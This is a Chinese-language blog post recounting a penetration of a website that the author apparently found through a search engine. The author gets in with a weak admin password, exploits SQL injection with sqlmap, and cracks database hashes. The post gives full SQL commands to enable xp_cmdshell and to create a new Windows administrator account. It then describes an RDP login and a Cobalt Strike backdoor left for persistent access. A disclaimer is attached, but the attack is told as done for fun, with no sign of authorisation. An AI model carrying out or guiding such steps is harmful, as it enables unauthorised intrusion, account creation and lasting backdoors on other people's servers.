---
title: 从网页到远程桌面的渗透
tags:
- 渗透
- 日记
- SQL注入
categories:
- [渗透]
description: 实战一个相对完整的渗透过程
keywords: 渗透, 弱口令, 提权, sql注入
cover: https://img.dreamfall.cn/cover/16.webp
date: 2023-05-21 16:33:00
updated: 2023-05-21 16:33:00
---

{% note red 'fas fa-fan' flat%}
以下内容属于渗透复现，未经授权的渗透测试是不允许的
{% endnote %}
{% note red 'fas fa-fan' flat%}
利用本文中的技术造成的后果与本人无关，倡导维护网络安全人人有责，共同维护网络文明和谐。
{% endnote %}

## 引子

5.20闲着无聊，那就来挖洞吧，打穿一台机器的体验可比去外面玩成就感大多了

## 过程

### 登录后台

通过搜索引擎搜索到了某个网站的后台，首先使用弱口令，（123456），结果直接进去了
![](https://img.dreamfall.cn/post/shentou/1.webp)

### 发现漏洞

通常，网站的后台会存在大量的漏洞，如文件上传，SQL注入等，我使用扫描器发现了该网站后台存在SQL报错注入。

![](https://img.dreamfall.cn/post/shentou/2.webp)

### SQL注入

标记扫描器扫出的SQL注入点后，直接进sqlmap跑，成功获得了数据库列表

![](https://img.dreamfall.cn/post/shentou/3.webp)
![](https://img.dreamfall.cn/post/shentou/4.webp)

查看当前用户权限，发现是dba（数据库管理员）

![](https://img.dreamfall.cn/post/shentou/5.webp)

查看数据库类型是SQL server，mssql的提权比mysql的方便，因为能直接调用xp_cmd模块直接执行命令

### 尝试执行命令

使用os-shell执行命令失败
![](https://img.dreamfall.cn/post/shentou/6.webp)
### 破解密码
尝试读取数据库用户密码哈希，通过在线查询哈希
![](https://img.dreamfall.cn/post/shentou/7.webp)

emmm
![](https://img.dreamfall.cn/post/shentou/8.webp)


成功获取到明文密码
![](https://img.dreamfall.cn/post/shentou/9.webp)

### 扫描端口
对目标服务器进行全端口扫描，发现目标机器开放了SQL server端口1433

![](https://img.dreamfall.cn/post/shentou/10.webp)

### 连接数据库

使用数据库连接工具成功连接
![](https://img.dreamfall.cn/post/shentou/11.webp)

### 查看当前用户权限

执行sql语句：
```sql
WITH CTE AS (
    SELECT
        u.name AS 用户名,
        u.is_disabled AS 是否禁用,
        g.name AS 服务器角色,
        '√' AS 'flag' 
    FROM
        sys.server_principals u
        INNER JOIN sys.server_role_members m ON u.principal_id = m.member_principal_id
        INNER JOIN sys.server_principals g ON g.principal_id = m.role_principal_id 
    ) SELECT
    * 
FROM
    CTE PIVOT ( MAX ( flag ) FOR 服务器角色 IN ( [public], [sysadmin], [securityadmin], [serveradmin], [setupadmin], [processadmin], [diskadmin], [dbcreator], [bulkadmin] ) ) AS T;
```

发现是system管理员权限
![](https://img.dreamfall.cn/post/shentou/12.webp)

### 执行命令

直接执行sql语句，打开xp_cmd

```sql
use master;
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'xp_cmdshell',1;
reconfigure;
```

![](https://img.dreamfall.cn/post/shentou/14.webp)
查看当前用户权限

```sql
use master;
exec master..xp_cmdshell "whoami";
```

![](https://img.dreamfall.cn/post/shentou/15.webp)
发现是system权限，直接创建新的管理员账户

### 创建管理员

```sql
use master;
exec master..xp_cmdshell "net user test12 dreamfall.cn1 /add";
```
![](https://img.dreamfall.cn/post/shentou/16.webp)
```sql
net localgroup administrators test12 /add
```
![](https://img.dreamfall.cn/post/shentou/17.webp)

### 远程桌面

通过远程桌面成功登录，获取目标主机的全部权限
![](https://img.dreamfall.cn/post/shentou/18.webp)

### 上线CS

在服务器中留下后门，以便随时随地访问此站

## 总结

**千万不要为了方便使用简单密码**

流程总结：弱口令进后台，后台sql注入，获取到数据库用户哈希，弱密码哈希破解，发现开数据库端口，直接连接，发现是dba权限，直接调用xp_cmd执行命令创建管理员账户，登录远程桌面